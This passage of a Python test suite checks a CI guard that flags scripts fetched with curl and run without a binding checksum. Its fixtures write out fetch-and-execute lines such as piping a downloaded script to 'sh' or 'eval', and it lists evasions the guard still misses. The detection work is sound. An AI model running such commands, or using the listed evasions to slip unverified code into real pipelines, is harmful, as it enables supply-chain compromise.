    run `./tool` with the checksum failing. A script's statements now sit in
    the branch of the command that runs it, and its keywords shape only its
    own map."""

    FETCH = "curl -fsSL -o tool https://example.test/tool\n"
    CHECK = 'echo "%s  tool" | sha256sum -c -\n' % HEX

    def job(self, opened, form, closed):
        return wg.job_defects([("step", self.FETCH + opened + form + "\n" + self.CHECK +
                                closed + "./tool\n")])

    def test_a_close_inside_a_script_does_not_close_the_steps_branch(self):
        for opened, closed in (("for f in $X; do\n", "done\n"),
                               ('if [ -n "$X" ]; then\n', "fi\n")):
            for form in ("sh <<< 'fi' || true", "sh -c 'fi' || true",
                         "sh <<'EOF' || true\nfi\nEOF", "eval 'fi' || true",
                         "sh -c 'done; esac' || true"):
                with self.subTest(opened=opened, form=form):
                    found = self.job(opened, form, closed)
                    self.assertEqual(1, len(found), found)
                    self.assertIn(wg._UNSHARED_BRANCH, found[0][1])

    def test_an_open_inside_a_script_does_not_hold_the_steps_branch_open(self):
        # The loop's `done` closed the script's `then` instead of the loop, and
        # `./tool` read as inside the loop with the checksum.
        found = wg.job_defects([("step", self.FETCH + "for f in $X; do\n" + self.CHECK +
                                 "sh -c 'if true; then' || true\ndone\n./tool\n")])
        self.assertEqual(1, len(found), found)
        self.assertIn(wg._UNSHARED_BRANCH, found[0][1])

    def test_a_script_on_the_line_opening_a_branch_runs_in_it(self):
        # It was read ahead of the `then`/`do` that carries it, as if it always
        # ran: base cleared `./tool` after `fi` with it, and bash skips it.
        for form in ("if [ -n \"$X\" ]; then sh -c '%s'; fi\n",
                     "for f in $X; do sh -c '%s'; done\n",
                     "if [ -n \"$X\" ]; then sh <<< '%s'; fi\n"):
            with self.subTest(form=form):
                found = wg.job_defects([("step", self.FETCH + form % self.CHECK.strip() +
                                         "./tool\n")])
                self.assertEqual(1, len(found), found)
                self.assertIn(wg._UNSHARED_BRANCH, found[0][1])
        # ... and, the other way, in the arm its pattern opens, with the use.
        self.assertEqual([], wg.job_defects([("step", self.FETCH + "case \"$X\" in\n"
                                              "  a) sh -c '%s'; ./tool ;;\nesac\n"
                                              % self.CHECK.strip())]))

    def test_the_scripts_own_branches_still_bind(self):
        # A checksum inside the script's own `if` clears nothing outside it;
        # one after the script's balanced branch clears the use after it.
        self.assertIn(wg._UNSHARED_BRANCH, wg.job_defects([("step", self.FETCH +
            "sh -ec 'if [ -n \"$X\" ]; then %s; fi'\n./tool\n" % self.CHECK.strip())])[0][1])
        self.assertEqual([], wg.job_defects([("step", self.FETCH +
            "sh -ec 'if true; then :; fi; %s'\n./tool\n" % self.CHECK.strip())]))
        self.assertEqual([], wg.job_defects([("step", self.FETCH + 'if [ -n "$X" ]; then\n' +
            "sh -ec '%s'\n./tool\nfi\n" % self.CHECK.strip())]))

    def test_without_the_script_the_branch_is_reported_as_before(self):
        # The must-trip control: reported on every tree.
        found = self.job("for f in $X; do\n", ":", "done\n")
        self.assertEqual(1, len(found), found)


class TestTheJobIsTheScope(unittest.TestCase):
    """M5: steps in one job share the workspace, /tmp and PATH.

    A rule scoped to a single `run:` block is evaded by splitting the act in
    two -- step A downloads, step B runs it -- and neither step is a
    fetch-and-exec on its own. The same sharing is what makes a checksum in a
    later step a legitimate verification of an earlier fetch, so the fold has
    to run both ways.
    """

    FETCH = ("fetch", "curl -sfL https://example.test/payload -o /tmp/payload\n")
    CHECK = ("check", 'echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX)
    RUN = ("run", "chmod +x /tmp/payload\n/tmp/payload --version\n")

    def test_a_fetch_in_one_step_and_the_execution_in_another(self):
        found = wg.job_defects([self.FETCH, self.RUN])
        self.assertEqual(1, len(found), found)
        step, why = found[0]
        self.assertEqual("fetch", step)         # attributed to the fetching step
        self.assertIn("/tmp/payload", why)

    def test_a_checksum_in_a_later_step_binds_an_earlier_fetch(self):
        self.assertEqual([], wg.job_defects([self.FETCH, self.CHECK, self.RUN]))

    def test_order_is_the_job_order(self):
        # The same three steps, check last: verified only AFTER the run.
        found = wg.job_defects([self.FETCH, self.RUN, self.CHECK])
        self.assertEqual(1, len(found), found)
        self.assertIn("only AFTER", found[0][1])

    def test_a_conditional_steps_check_does_not_count(self):
        # M4: folding an `if:` step as if it always runs is conservative on the
        # fetch axis and FAIL-OPEN on the check axis -- a checksum that may be
        # skipped cannot clear a download that always happens.
        steps = [wg.Step(*self.FETCH),
                 wg.Step(self.CHECK[0], self.CHECK[1], None,
                         "github.event_name == 'push'"),
                 wg.Step(*self.RUN)]
        found = wg.job_defects(steps)
        self.assertEqual(1, len(found), found)
        self.assertEqual("fetch", found[0][0])

    def test_a_check_under_the_SAME_condition_as_the_use_still_binds(self):
        # The shape the fleet actually has (nvd-cache.yml's sync step): the
        # fetch, the checksum and the `unzip` share one `if:`, so they run
        # together or not at all. A blanket "no conditional check counts" rule
        # fails THIS, which is how the fleet caught it.
        when = "steps.decide.outputs.sync == 'true'"
        steps = [wg.Step(self.FETCH[0], self.FETCH[1], None, when),
                 wg.Step(self.CHECK[0], self.CHECK[1], None, when),
                 wg.Step(self.RUN[0], self.RUN[1], None, when)]
        self.assertEqual([], wg.job_defects(steps))

    def test_one_conditional_step_holding_all_three_binds(self):
        script = self.FETCH[1] + self.CHECK[1] + self.RUN[1]
        self.assertEqual([], wg.job_defects(
            [wg.Step("sync", script, None, "steps.decide.outputs.sync == 'true'")]))

    def test_a_conditional_step_still_counts_as_fetching(self):
        steps = [wg.Step(self.FETCH[0], self.FETCH[1], None, "always()"),
                 wg.Step(*self.RUN)]
        self.assertEqual(1, len(wg.job_defects(steps)))

    def test_a_job_level_condition_reaches_every_step(self):
        doc = {"jobs": {"b": {"if": "github.ref == 'main'",
                              "steps": [{"run": "make test"}]}}}
        self.assertEqual("github.ref == 'main'", wg.run_jobs(doc)[0][1][0].condition)

    def test_a_job_with_no_fetch_is_clean(self):
        self.assertEqual([], wg.job_defects([("build", "make test\n")]))


class TestAUseThatRunsAfterAFailedStepIsNotCredited(unittest.TestCase):
    """#2632: a cross-step checksum that only stops ITS OWN step cannot clear a
    use in a later step whose `if:` runs AFTER a failure. A step with `always()`,
    `failure()` or `!cancelled()` runs even when an earlier step failed, so the
    checksum in step a -- which stopped step a -- never gated the payload step b
    runs; crediting it is fail-open. `success()`, a plain expression and no `if:`
    are SKIPPED after a failure, so the earlier stop still gates them and the
    credit stands. A check and a use inside ONE `always()` step share the `if:`
    and still bind (the checksum's own failure kills the step before the use) --
    the control against over-correcting this into a false positive.
    """

    FETCH = "curl -sfL https://example.test/payload -o /tmp/payload\n"
    CHECK = 'echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX
    USE = "chmod +x /tmp/payload\n/tmp/payload --version\n"
    SHELLS = (None, "bash", "sh")                      # default, bash, sh
    AFTER_FAILURE = ("always()", "failure()", "!cancelled()")
    GATED = ("success()", None, "${{ github.ref == 'refs/heads/main' }}")

    def job(self, check_body, when, shell):
        # step a: the fetch and the checksum, no `if:`; step b: the use under `when`.
        return [wg.Step("get", self.FETCH + check_body, shell),
                wg.Step("run", self.USE, shell, when)]

    def _check_shapes(self):
        return (self.CHECK, self.CHECK.rstrip() + " || exit 1\n")

    def test_a_use_after_a_failed_step_is_not_cleared(self):
        # RED before the fix: every cell read CLEAN -- the checksum stopped step a,
        # but step b runs on regardless and the guard credited the stop anyway.
        for check in self._check_shapes():
            for when in self.AFTER_FAILURE:
                for shell in self.SHELLS:
                    with self.subTest(check=check, when=when, shell=shell):
                        found = wg.job_defects(self.job(check, when, shell))
                        self.assertEqual(1, len(found), found)
                        self.assertEqual("get", found[0][0])
                        self.assertIn(wg._UNSHARED_IF, found[0][1])

    def test_a_skipped_use_keeps_the_credit(self):
        # `success()`/plain-expression/none are skipped after a failure, so the
        # step-a stop still gates them: these stay CLEAN (control).
        for check in self._check_shapes():
            for when in self.GATED:
                for shell in self.SHELLS:
                    with self.subTest(check=check, when=when, shell=shell):
                        self.assertEqual([], wg.job_defects(self.job(check, when, shell)))

    def test_a_check_and_use_in_one_always_step_still_bind(self):
        # Same `always()` on both halves in ONE step: if the checksum fails under
        # -e the step dies before the use, so the credit is real -- stays CLEAN.
        for shell in self.SHELLS:
            with self.subTest(shell=shell):
                self.assertEqual([], wg.job_defects(
                    [wg.Step("one", self.FETCH + self.CHECK + self.USE, shell, "always()")]))

    def test_a_soft_check_reports_under_every_if(self):
        # Must-trip control: `|| true` makes the checksum clear nothing, so every
        # posture reports -- proof the pins above can fail.
        for when in self.AFTER_FAILURE + self.GATED:
            for shell in self.SHELLS:
                with self.subTest(when=when, shell=shell):
                    found = wg.job_defects(
                        self.job(self.CHECK.rstrip() + " || true\n", when, shell))
                    self.assertEqual(1, len(found), found)


class TestEveryUseIsAskedForItsCheck(unittest.TestCase):
    """Review I-1 of the #1793 follow-ups: `_defect` asked only a download's
    FIRST use whether a binding checksum came before it. A use inside the
    checksum's branch, `case` arm, loop body or `if:` step, ahead of a use
    after it, took the binding, and the job read clean while bash 3.2 and 5.2
    run the later use with the checksum skipped. Each use is asked now, in
    order, and the first one no checksum clears is the one reported: reading
    one more use can add a report, never remove one."""

    URL = "https://example.test/tool"
    CHECK = 'echo "%s  %%s" | sha256sum -c -\n' % HEX
    PLACES = ("shell branch", "case arm", "loop", "if: step")
    # (where the download lands, a use the follow-ups taught the guard to
    # read, the use after it that nothing guards)
    USES = (("tool", '"$PWD/tool" --version', "./tool"),                      # #2310
            ("/usr/local/bin/tool", "tool --version", "/usr/local/bin/tool"),  # #2308
            ("tool", "env x-y=1 ./tool --version", "./tool"),                 # #2307
            ("tool", "sh <<< './tool --version'", "./tool"))                  # #2293

    def job(self, place, dest, inside, after):
        fetch = "curl -fsSL -o %s %s\n" % (dest, self.URL)
        body = self.CHECK % dest + (inside + "\n" if inside else "")
        if place == "if: step":
            return [wg.Step("get", fetch), wg.Step("check", body, None, "env.X == 'y'"),
                    wg.Step("run", after + "\n")]
        opened, closed = {"shell branch": ('if [ -n "$X" ]; then\n', "fi\n"),
                          "case arm": ('case "$X" in\na)\n', ";;\nesac\n"),
                          "loop": ("for f in $X; do\n", "done\n")}[place]
        return [("step", fetch + opened + body + closed + after + "\n")]

    def assertReported(self, place, found):
        self.assertEqual(1, len(found), found)
        self.assertIn(wg._UNSHARED_IF if place == "if: step" else wg._UNSHARED_BRANCH,
                      found[0][1])

    def test_a_use_the_checksum_guards_does_not_clear_one_after_it(self):
        for place in self.PLACES:
            for dest, inside, after in self.USES:
                with self.subTest(place=place, inside=inside):
                    self.assertReported(place, wg.job_defects(self.job(place, dest, inside, after)))

    def test_nor_does_a_use_the_guard_always_read(self):
        # The same weakness with a use the guard read before the follow-ups:
        # base read these clean as well.
        for place in self.PLACES:
            with self.subTest(place=place):
                self.assertReported(place, wg.job_defects(
                    self.job(place, "tool", "./tool --version", "./tool")))

    def test_without_the_use_inside_it_is_reported_as_before(self):
        # The must-trip control: reported on every tree.
        for place in self.PLACES:
            for dest, _inside, after in self.USES:
                with self.subTest(place=place, after=after):
                    self.assertReported(place, wg.job_defects(self.job(place, dest, None, after)))

    def test_a_checksum_before_every_use_still_clears_them_all(self):
        for dest, inside, after in self.USES:
            script = ("curl -fsSL -o %s %s\n" % (dest, self.URL) + self.CHECK % dest +
                      'if [ -n "$X" ]; then\n%s\nfi\n%s\n' % (inside, after))
            with self.subTest(inside=inside):
                self.assertEqual([], wg.job_defects([("step", script)]))


class TestAnUnparseableShellIsNotAPass(unittest.TestCase):
    """L1: the parser reads sh/bash. A step that runs pwsh, python or cmd is
    not clean, it is UNREAD -- and saying so is the only honest answer."""

    def test_a_pwsh_step_is_reported(self):
        found = wg.job_defects([wg.Step("install", "Invoke-WebRequest x", "pwsh")])
        self.assertEqual(1, len(found), found)
        self.assertIn("pwsh", found[0][1])

    def test_a_python_step_is_reported(self):
        found = wg.job_defects([wg.Step("install", "import urllib", "python")])
        self.assertIn("python", found[0][1])

    def test_bash_and_sh_are_parsed(self):
        for shell in ("bash", "sh", "bash -e {0}", None):
            self.assertEqual([], wg.job_defects([wg.Step("x", "make test\n", shell)]),
                             shell)

    def test_the_effective_shell_comes_from_the_document(self):
        doc = {"defaults": {"run": {"shell": "pwsh"}},
               "jobs": {"b": {"steps": [{"name": "s", "run": "echo hi"}]}}}
        self.assertEqual([("b", [wg.Step("s", "echo hi", "pwsh")])],
                         wg.run_jobs(doc))

    def test_a_job_default_shell_beats_the_workflow_default(self):
        doc = {"defaults": {"run": {"shell": "pwsh"}},
               "jobs": {"b": {"defaults": {"run": {"shell": "bash"}},
                              "steps": [{"run": "echo hi", "shell": "sh"}]}}}
        self.assertEqual("sh", wg.run_jobs(doc)[0][1][0].shell)


# --- #1697: the documented gap list, as executable pins -----------------------
# The module docstring names ten forms this guard does not model. A list of
# fail-open forms written only in prose ROTS: a form that starts being caught
# keeps its entry, a form that stops being caught gains none, and either way
# the list stops describing the control. So each of the ten runs here, through
# `job_defects`, in the smallest step that spells it -- and the assertion is
# the current answer, whatever that answer is.
#
# Every one of them was accepted when this class was written. #1697 then ruled
# each by REACHABILITY: four were reachable and are CLOSED, so their pin is
# `flagged`; six keep their entry in the docstring with the reason they keep
# it, so their pin is `accepted` -- the fail-open state said out loud, where a
# change that starts catching one has to come and edit it.


class TestTheGapsTheGuardDocuments(unittest.TestCase):
    """#1697: the ten forms the module docstring ruled, each as a live step,
    and an eleventh ruled since (#2308)."""

    def accepted(self, *steps):
        """The job is clean -- this form goes unseen, and says so out loud."""
        found = wg.job_defects(list(steps))
        self.assertEqual([], found, found)

    def flagged(self, *steps):
        """The form was ruled reachable and the guard now reports it."""
        found = wg.job_defects(list(steps))
        self.assertEqual(1, len(found), found)
        return found[0][1]

    # 1. a fetcher that is not curl/wget.
    def test_a_fetcher_that_is_not_curl_or_wget(self):
        for fetch in ("gh release download v1.2.3 -O /tmp/payload\n",
                      "aws s3 cp s3://bucket/payload /tmp/payload\n"):
            self.accepted(("get", fetch), ("run", "chmod +x /tmp/payload\n"))

    # 2. variable expansion: the same file under two spellings.
    def test_a_destination_spelled_one_way_and_used_another(self):
        self.accepted(("get", 'DEST=/tmp/payload\n'
                              'curl -sfL https://example.test/p -o "$DEST"\n'),
                      ("run", "chmod +x /tmp/payload\n/tmp/payload\n"))

    def test_a_use_spelled_another_way_off_the_command_word(self):
        # #2310 closed a command word with a `$` ending in the download's
        # basename (`TestADownloadRunThroughAnExpandedPath`), #2345 an operand
        # (`TestADollarSpelledPathOnEitherSideBindsByItsLastPart`), and #2425 a
        # word the step's own value expands (`P=./payload`, read through
        # `workflow_uses.static_values`); a tilde still names nothing fetched.
        fetch = ("get", "curl -sfL https://example.test/p -o payload\n")
        for run in ("~/payload 9\n",):
            with self.subTest(run=run):
                self.accepted(fetch, ("run", run))
        for run in ('P=./payload\n"$P" 9\n', 'P=./payload\nsh "$P"\n',
                    '"$PWD/payload" 9\n', 'sh "$PWD/payload"\n'):
            with self.subTest(run=run):
                self.flagged(fetch, ("run", run))

    def test_a_path_reached_through_a_cd(self):
        # #2427 follows a static `cd`; #2345 (e) already bound the glob twin.
        cuda = "curl -fsSLo cuda_1.run https://example.test/cuda_1.run\nmkdir -p s\ncd s\n"
        for run in ("mkdir -p d\ncurl -fsSLo d/x.sh https://example.test/x.sh\ncd d\nsh x.sh\n",
                    cuda + "sh ../cuda_1.run\n"):
            with self.subTest(run=run):
                self.flagged(("run", run))
        self.flagged(("run", cuda + "sh ../cuda_*.run\n"))

    def test_a_download_carried_in_a_variable_beyond_the_shape_that_is_read(self):
        # #2341 follows `x=$(curl ...)` to a shell whole, or a whole copy of it
        # (`TestADownloadCarriedInAVariable`); through a cut, a command's output
        # or a file, from a substitution holding more than the fetch, or through
        # a printer other than echo, printf or a heredoc-fed `cat` (#2467), it is
        # a value the guard does not follow.
        get = "x=$(curl -fsSL https://example.test/i.sh)\n"
        for run in (get + 'echo "$x" > f\nsh f\n',
                    "x=$(curl -fsSL https://example.test/i.sh | tr -d '\\r')\neval \"$x\"\n",
                    'x=$(curl -fsSL https://example.test/i.sh || true)\neval "$x"\n'):
            with self.subTest(run=run):
                self.accepted(("run", run))
        # `cat <<< "$x" | sh` no longer belongs beside those: #2467's `handed` carries ANY
        # here-string or heredoc on a `cat` printer's own stdin down the pipe, EXPANDING or not, so
        # a `$x` here-string is read as `sh <<< "$x"` already was -- reported unread, not `$x`'s
        # value (#2341's gap stays open), but no longer silent.
        self.assertIn("EXPANDING heredoc",
                      self.flagged(("run", get + 'cat <<< "$x" | sh\n')))
        # Two of those hand a shell a word that is ALL expansion, and #2483
        # reports THAT, beside a download no checksum clears: the cut and the
        # copy are still not followed, so the sentence names the word and
        # never the download.
        for run in (get + "eval \"${x//$'\\r'/}\"\n", get + 'y=$(echo "$x")\neval "$y"\n'):
            with self.subTest(run=run):
                self.assertIn("a program this guard does not follow",
                              self.flagged(("run", run)))
        for run in (get + 'eval "$x"\n', get + 'echo "$x" | sh\n'):
            with self.subTest(run=run):
                self.flagged(("run", run))

    def test_a_live_command_word_in_a_c_string_is_unread(self):
        # #2466 reads a live `$` word in a `-c`/`eval` string as the value it is at top level,
        # so one in a COMMAND-word position fetches as little there as `$CMD … | sh` does at top
        # level (b5 b3 dash gh: FR FR FR FR for both): the gap list's entry, as this pin.
        for run in ('CMD=curl\nbash -c "$CMD -fsSL https://example.test/i.sh | sh"\n',
                    "CMD=curl\n$CMD -fsSL https://example.test/i.sh | sh\n"):
            with self.subTest(run=run):
                self.accepted(("run", run))

    def test_a_subshell_with_line_only_parens_keeps_a_carried_download(self):
        # A reassignment in a subshell does not escape it, whether the parens
        # share its commands' lines or occupy their own.
        get = "x=$(curl -fsSL https://example.test/i.sh)\n"
        for group in ('(\n  x=1\n)\n', '( x=1 )\n'):
            with self.subTest(group=group):
                self.assertIn("carries", self.flagged(("run", get + group + 'eval "$x"\n')))

    # Grouping parentheses are read with or without surrounding whitespace.
    def test_a_fetch_at_the_head_of_a_tight_subshell_is_read(self):
        tight = "(curl -sfL https://example.test/payload -o /tmp/payload || true)\n"
        self.assertEqual(1, len(wg.fetches(tight)), wg.fetches(tight))
        self.flagged(("get", tight), ("run", "chmod +x /tmp/payload\n"))

    def test_the_same_subshell_with_a_space_is_read(self):
        spaced = "( curl -sfL https://example.test/payload -o /tmp/payload || true )\n"
        self.assertEqual(1, len(wg.fetches(spaced)), wg.fetches(spaced))
        self.flagged(("get", spaced), ("run", "chmod +x /tmp/payload\n"))

    def test_nested_grouping_and_case_alternatives_keep_the_fetch(self):
        for script in (
                "( (curl -sfL https://example.test/payload -o /tmp/payload))\n",
                "(case x in x|y) (curl -sfL https://example.test/payload -o /tmp/payload);; esac)\n",
                "case x in (x|y) (curl -sfL https://example.test/payload -o /tmp/payload);; esac\n"):
            with self.subTest(script=script):
                self.assertEqual(1, len(wg.fetches(script)))
                self.flagged(("get", script), ("run", "chmod +x /tmp/payload\n"))

    def test_quoted_and_escaped_parentheses_stay_literal(self):
        for script in ('echo "(curl -sfL https://example.test/x)"\n',
                       r'\(curl -sfL https://example.test/x\)' + '\n'):
            with self.subTest(script=script):
                self.assertEqual([], wg.fetches(script))
        fetch = wg.fetches('(curl -sfL "https://example.test/(payload)" -o /tmp/payload)')[0]
        self.assertEqual(fetch.url, "https://example.test/(payload)")
        self.assertEqual(fetch.dest, "/tmp/payload")

    # 3. what runs inside a container. CLOSED for the shape the fleet can
    # reach -- a bind mount and an interpreter operand -- because the reader
    # already yields that argv. Mounts are NOT modelled: the binding is by
    # basename, which is the only name the bytes have on the far side.
    def test_a_container_running_the_download_under_a_shell(self):
        self.flagged(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                     ("run", "docker run --rm -v /tmp:/w img bash /w/x.sh\n"))

    def test_a_podman_run_counts_the_same(self):
        self.flagged(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                     ("run", "podman run --rm -v /tmp:/w img sh /w/x.sh\n"))

    def test_a_container_running_another_file_is_left_alone(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                      ("run", "docker run --rm -v /tmp:/w img bash /w/other.sh\n"))

    def test_a_verified_download_may_be_run_in_a_container(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                      ("check", 'echo "%s  /tmp/x.sh" | sha256sum -c -\n' % HEX),
                      ("run", "docker run --rm -v /tmp:/w img bash /w/x.sh\n"))

    def test_a_docker_build_is_not_a_container_run(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                      ("run", "docker build -f x.sh .\n"))

    # The three shapes the container entry still names as unread, each one a
    # pin so the docstring cannot drift from what the code does.
    def test_a_file_renamed_by_the_mount_is_unread(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                      ("run", "docker run --rm -v /tmp/x.sh:/w/y.sh img "
                              "bash /w/y.sh\n"))

    def test_an_argument_the_entrypoint_supplies_is_unread(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                      ("run", "docker run --rm -v /tmp:/w img\n"))

    def test_what_the_image_runs_on_its_own_is_unread(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                      ("run", "docker run --rm -v /tmp:/w img /w/x.sh\n"))

    def test_the_fleets_own_container_line_is_still_clean(self):
        # adapter-integration.yml's shape, which fetches nothing: the scan must
        # not invent a use out of an `--entrypoint sh` and an image name.
        self.accepted(("run", 'docker run --rm -v "$PWD:/work:ro" -w /work '
                              "--entrypoint sh panopticon-fixtures:latest "
                              '-c "python3 -m pytest tests/tools/ -q"\n'))

    # 4. bytes modified after a passing check.
    def test_bytes_modified_after_a_passing_check(self):
        self.accepted(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                      ("check", 'echo "%s  /tmp/p" | sha256sum -c -\n' % HEX),
                      ("run", "sed -i s/a/b/ /tmp/p\nchmod +x /tmp/p\n/tmp/p\n"))

    # 5. a chmod over a glob -- and over a directory, which is the same act.
    # CLOSED: ordinary bash, and the fleet writes both spellings
    # (`chmod -R a+rX odc-data` in nvd-cache.yml, `find ... | xargs` in both
    # Dockerfiles). A glob names nothing, but it DESIGNATES the download.
    def test_a_chmod_over_a_glob_is_making_it_executable(self):
        self.flagged(("get", "curl -sfL https://example.test/x.sh -o /tmp/d/x.sh\n"),
                     ("run", "chmod +x /tmp/d/*.sh\n"))

    def test_a_recursive_chmod_over_the_directory_is_making_it_executable(self):
        self.flagged(("get", "curl -sfL https://example.test/x.sh -o /tmp/d/x.sh\n"),
                     ("run", "chmod -R +x /tmp/d\n"))

    def test_a_recursive_chmod_over_the_root_is_the_widest_of_all(self):
        # `os.path.normpath("/")` is `/`, so the prefix test asked whether the
        # path starts with `//`: the single widest spelling bound nothing.
        self.flagged(("get", "curl -sfL https://example.test/x.sh -o /tmp/d/x.sh\n"),
                     ("run", "chmod -R +x /\n"))

    def test_a_recursive_chmod_over_the_root_leaves_a_relative_file_alone(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o x.sh\n"),
                      ("run", "chmod -R +x /\n"))

    def test_a_glob_that_does_not_match_the_download_is_left_alone(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/d/x.sh\n"),
                      ("run", "chmod +x /tmp/d/*.py\n"))

    def test_a_recursive_chmod_over_another_directory_is_left_alone(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/d/x.sh\n"),
                      ("run", "chmod -R +x /tmp/e\n"))

    def test_a_glob_bound_download_can_still_be_cleared(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/d/x.sh\n"),
                      ("check", 'echo "%s  /tmp/d/x.sh" | sha256sum -c -\n' % HEX),
                      ("run", "chmod +x /tmp/d/*.sh\n"))

    # 6. a fetch inside an `eval` STRING (not a substitution). CLOSED: the
    # string is shell, and this module reads shell -- the quotes are not a
    # grammar it lacks, only one it was not looking through.
    def test_a_fetch_inside_an_eval_string(self):
        self.flagged(("get", 'eval "curl -sfL https://example.test/p -o /tmp/p"\n'),
                     ("run", "chmod +x /tmp/p\n/tmp/p\n"))

    def test_a_fetch_inside_a_sh_dash_c_string(self):
        self.flagged(("get", 'sh -c "curl -sfL https://example.test/p -o /tmp/p"\n'),
                     ("run", "chmod +x /tmp/p\n/tmp/p\n"))

    def test_a_clustered_c_flag_is_still_a_script(self):
        # `sh -ec`, `bash -lc`, `bash -euc`: the ordinary CI idiom, not an
        # obfuscation. A short-option cluster carrying `c` IS `-c`.
        for opener in ("sh -ec", "bash -lc", "bash -euc", "bash -x -c"):
            self.flagged(("get", '%s "curl -sfL https://example.test/p '
                                 '-o /tmp/p"\n' % opener),
                         ("run", "chmod +x /tmp/p\n/tmp/p\n"))

    def test_a_shell_flag_cluster_without_c_hands_over_no_script(self):
        self.accepted(("run", 'sh -eu "curl -sfL https://example.test/p '
                              '-o /tmp/p"\nchmod +x /tmp/p\n'))

    def test_a_fetch_and_its_use_both_inside_the_string(self):
        self.flagged(("run", 'eval "curl -sfL https://example.test/p -o /tmp/p; '
                             'chmod +x /tmp/p"\n'))

    def test_a_checksum_inside_the_string_still_clears_it(self):
        # The expansion keeps the ORDER, so a step hardened inside its own
        # quoted script is read as hardened rather than as unread -- where
        # the checksum stops the script: under `sh -ec`, and not under a bare
        # `sh -c`, which carries on to the `chmod` (review I-2).
        script = ('sh -%s "curl -sfL https://example.test/p -o /tmp/p; '
                  'echo %s  /tmp/p | sha256sum -c -; chmod +x /tmp/p"\n')
        self.accepted(("run", script % ("ec", HEX)))
        self.assertIn("carries on past its failure", self.flagged(("run", script % ("c", HEX))))

    def test_a_pipe_to_a_shell_inside_the_string_is_still_a_pipe_to_a_shell(self):
        self.flagged(("run", 'eval "curl -sfL https://example.test/i.sh | sh"\n'))

    def test_a_string_that_fetches_nothing_is_left_alone(self):
        self.accepted(("run", 'sh -c "echo hello; /usr/bin/true"\n'))

    # 7. an executor that reads the file by convention, not by argument.
    def test_an_executor_that_reads_the_file_by_convention(self):
        self.accepted(("get", "curl -sfL https://example.test/m -o Makefile\n"),
                      ("run", "make\n"))
        self.accepted(("get", "curl -sfL https://example.test/p -o package.json\n"),
                      ("run", "npm install\n"))

    # 8. a digest computed from the download itself.
    def test_a_digest_computed_from_the_download_itself(self):
        self.accepted(
            ("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
            ("check", 'SHA="$(sha256sum /tmp/p | cut -d\' \' -f1)"\n'
                      'echo "$SHA  /tmp/p" | sha256sum -c -\n'),
            ("run", "chmod +x /tmp/p\n/tmp/p\n"))

    def test_a_sums_file_the_step_computed_from_the_download_is_already_caught(self):
        # The other spelling of the same theatre, and this half is NOT a gap:
        # the recorded text is `sha256sum /tmp/p`, which carries no digest.
        found = wg.job_defects(
            [("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
             ("check", "sha256sum /tmp/p > /tmp/p.sha\nsha256sum -c /tmp/p.sha\n"),
             ("run", "chmod +x /tmp/p\n")])
        self.assertEqual(1, len(found), found)

    # 9. `find -exec` and `xargs` operands. CLOSED with 5: the same act, the
    # operand describing the file instead of naming it.
    def test_a_find_exec_operand_is_making_it_executable(self):
        self.flagged(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                     ("run", r"find /tmp -name p -exec chmod +x {} \;" "\n"))

    def test_an_xargs_operand_is_making_it_executable(self):
        self.flagged(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                     ("run", "echo /tmp/p | xargs chmod +x\n"))

    def test_a_find_piped_into_xargs_is_making_it_executable(self):
        self.flagged(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                     ("run", "find /tmp -name p | xargs chmod +x\n"))

    def test_a_stage_that_merely_names_xargs_inherits_nothing(self):
        # `xargs` counts where it stands IN FRONT of the command, which is
        # where `command()` strips it. A file that happens to be called
        # `xargs` is an operand, and operands hand nothing over.
        self.accepted(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                      ("run", "echo /tmp/p | chmod +x xargs\n"))

    def test_an_option_before_the_starting_point_still_walks_it(self):
        # `-H`/`-L`/`-P` precede the starting points and are not predicates;
        # reading one as "no roots" reopens the form.
        for option in ("-H", "-L", "-P"):
            self.flagged(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                         ("run", r"find %s /tmp -name p -exec chmod +x {} \;"
                                 % option + "\n"))

    def test_a_find_with_no_starting_point_walks_the_working_directory(self):
        # The commonest spelling of all: no root means `.`.
        self.flagged(("get", "curl -sfL https://example.test/p -o p\n"),
                     ("run", r"find -name p -exec chmod +x {} \;" "\n"))

    def test_a_find_over_another_tree_is_left_alone(self):
        self.accepted(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                      ("run", r"find /opt -name p -exec chmod +x {} \;" "\n"))

    # a heredoc body a substitution prints for `eval` (added by #1697's review:
    # it used to CRASH; since #2336 it was `cat`'s input, and `eval` ran it
    # unread). R-P1, the gap CLOSED: since #2495 a quoted heredoc a `cat` alone
    # prints in a `$(...)` is the text `eval` runs, read as written. Bash
    # 5.2.21, 3.2.57, dash and the GitHub pairing fetch the download and make
    # it executable unverified (b5 b3 dash gh: F- F- F- F-, measured with `p`
    # for `/tmp/p`; nothing here runs it); the twin running a stream is d09
    # in `test_workflow_printers.py` (FR FR FR FR). Since fix round 1 the
    # catch-all row for a word all substitution stands beside that read
    # (main / base / 19423415: CLEAN / CLEAN / the one sentence).
    def test_a_heredoc_body_inside_a_substitution_is_read_since_2495(self):
        step = ("run", 'eval "$(cat <<\'EOF\'\n'
                       "curl -sfL https://example.test/p -o /tmp/p\n"
                       "chmod +x /tmp/p\n"
                       'EOF\n)"\n')
